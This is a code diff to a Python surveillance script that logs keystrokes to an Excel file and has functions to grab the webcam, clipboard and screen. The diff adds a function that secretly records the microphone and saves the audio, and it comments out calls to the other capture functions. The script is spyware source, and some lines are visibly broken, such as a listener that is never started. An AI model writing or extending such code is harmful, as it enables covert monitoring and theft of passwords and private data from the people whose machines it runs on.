@@ -7,8 +7,12 @@ import datetime
 import win32clipboard 
 import pandas
 from cv2 import VideoCapture, imshow, imwrite, waitKey, destroyWindow
+import sounddevice
+from scipy.io.wavfile import *
 
 keystrokes = [] #store strokes in list 
+audio_path="" #add path to save file and add \\ to the end
+sound_file="sound.mp3"
 
 def on_press(key):
 	key.append(key)
@@ -54,8 +58,7 @@ def capture_camera():
         waitKey(1)
         destroyWindow("webcam")
 
-capture_camera()
-clipboard_copy()
+
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
 	listener.join
@@ -76,8 +79,19 @@ data = {
 dataFrame = pandas.DataFrame(data)
 dataFrame.to_excel("keystrokes.xlsx", index=False)
 
-screenshot()
 
+def microphone():
+    cd_audio_rate = 44100 #CDs 48000 for Video and 96000 for HD sound
+    time = 10 #adjust time as need be
+    record = sounddevice.rec(int(time*cd_audio_rate), samplerate=cd_audio_rate,channels=1) #adjust channels as need
+    sounddevice.wait()
+    write(audio_path + sound_file, cd_audio_rate, record)
+
+#microphone()
+
+#screenshot()
+#capture_camera()
+#clipboard_copy()
 
 
 
